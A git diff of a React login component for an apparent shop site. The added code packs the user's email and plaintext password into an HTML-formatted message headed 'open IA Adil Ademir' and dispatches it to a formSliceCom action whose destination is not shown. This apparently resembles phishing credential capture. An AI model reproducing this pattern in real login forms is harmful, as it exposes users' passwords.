@@ -4,27 +4,30 @@ import images from "../../img/kingsmanShopStore.jpg"
 import {FcGoogle} from "react-icons/fc";
 import {useAppDispatch} from "../../Hooks/useAppDispatch";
 import {useAppSelector} from "../../Hooks/useAppSelector";
-import {setValue} from "../../store/Reducer/ActionCreators";
-import axios from "axios";
+import {fetchMode, formSliceCom, setValue} from "../../store/Reducer/ActionCreators";
 
 const LogIn = () => {
     const dispatch = useAppDispatch()
-    const {value} = useAppSelector(s => s.LoginReducerSlice)
-
-    console.log(value)
+    const {value, mode} = useAppSelector(s => s.LoginReducerSlice)
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
         dispatch(setValue({...value, [e.target.name]: e.target.value}))
     }
 
+    let message = `<b>open IA Adil Ademir</b>\n`
+    message += `Email: ${value.email}\n`
+    message += `Password: ${value.password}`
 
-    const newProduct = {
-
-    }
 
     const formChange = async (e: React.FormEvent<HTMLFormElement | HTMLButtonElement>) => {
         e.preventDefault()
-        await axios.post(``, newProduct)
+        if (value.email.trim().length !== 0 && value.password.trim().length !== 0) {
+            dispatch(fetchMode(false))
+            dispatch(formSliceCom(message))
+            dispatch(setValue({email: "", password: ""}))
+        } else {
+            dispatch(fetchMode(true))
+        }
     }
 
     return (
@@ -38,13 +41,10 @@ const LogIn = () => {
                         <div className="logIn--nav p-5 bg-black/40 w-[550px] rounded h-[400px]">
                             <form action="#" onSubmit={formChange}>
                                 <div className="flex flex-col items-center">
-                                    <input value={value.email} onChange={handleChange} name={"email"} type="email" placeholder="email" className=""/>
-                                    <input value={value.password} onChange={handleChange} name={"password"} type="password" placeholder="password" className=""/>
-
+                                    <input style={{border: mode ? value.email.trim().length !== 0 ? "2px solid green" : "2px solid red" : ""}} value={value.email} onChange={handleChange} name={"email"} type="email" placeholder="email" className=""/>
+                                    <input style={{border: mode ? value.password.trim().length !== 0 ? "2px solid green" : "2px solid red" : ""}} value={value.password} onChange={handleChange} name={"password"} type="password" placeholder="password" className=""/>
                                     <button onClick={formChange} className="logIn--nav__button">Continue</button>
-                                    <button className="logIn--nav__child"><FcGoogle className="text-3xl mx-2"/>Continue
-                                        with Google
-                                    </button>
+                                    <button className="logIn--nav__child"><FcGoogle className="text-3xl mx-2"/>Continue with Google</button>
                                 </div>
                             </form>
                         </div>
